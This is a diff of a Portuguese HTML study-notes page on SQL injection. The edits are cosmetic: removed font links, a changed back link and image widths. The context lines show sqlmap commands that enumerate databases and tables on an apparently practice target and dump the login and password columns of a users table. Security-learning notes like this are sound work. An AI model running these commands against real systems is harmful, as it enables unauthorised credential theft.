@@ -2,8 +2,6 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <link rel="preconnect" href="https://fonts.gstatic.com">
-    <link href="https://fonts.googleapis.com/css2?family=Ovo&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
     <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
     <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
@@ -20,7 +18,7 @@
         <div class="col-sm-12" id="titulo">
             <h1>SQL Injection</h1>
             <h6><strong>SQL Injection manual e automatizado com Sqlmap</strong></h6>
-            <a href="../../index.html" class="btn btn-link" id="btnLink">Voltar</a>
+            <a href="../../resumos/seguranca.html" class="btn btn-link" id="btnLink">Voltar</a>
         </div>
 
         <div class="col-sm-12">
@@ -69,11 +67,11 @@ sqlmap -u http://www.bancocn.com/cat.php?id=3 --dbs --dbms=mysql
 <small><pre id="codigo"><code>
 sqlmap -r lista.txt --dbs --dbms=mysql
 </code></pre></small>
-            <img src="anexos/sqlInjection/header.png" class="img-fluid">
+            <img src="anexos/sqlInjection/header.png" width="800px" class="img-fluid">
             <br><br>
-            <img src="anexos/sqlInjection/listatxt.png" class="img-fluid">
+            <img src="anexos/sqlInjection/listatxt.png" width="400px" class="img-fluid">
             <br><br>
-            <img src="anexos/sqlInjection/sqlmap.png" class="img-fluid">
+            <img src="anexos/sqlInjection/sqlmap.png" width="400px" class="img-fluid">
             <br><br>
 <small><pre id="codigo"><code>
 <b>Nome das tables:</b>
@@ -83,11 +81,11 @@ sqlmap -r lista.txt --dbms=mysql -D bancocn -T users --columns
 <b>Dados das columns:</b>
 sqlmap -r lista.txt --dbms=mysql -D bancocn -T users -C login,password --dump
 </code></pre></small>
-            <img src="anexos/sqlInjection/sqlmap2.png" class="img-fluid">
+            <img src="anexos/sqlInjection/sqlmap2.png" width="400px" class="img-fluid">
             <br><br>
-            <img src="anexos/sqlInjection/sqlmap3.png" class="img-fluid">
+            <img src="anexos/sqlInjection/sqlmap3.png" width="400px" class="img-fluid">
             <br><br>
-            <img src="anexos/sqlInjection/sqlmap4.png" class="img-fluid">
+            <img src="anexos/sqlInjection/sqlmap4.png" width="400px" class="img-fluid">
             <br><br>
         </div>
     </div>
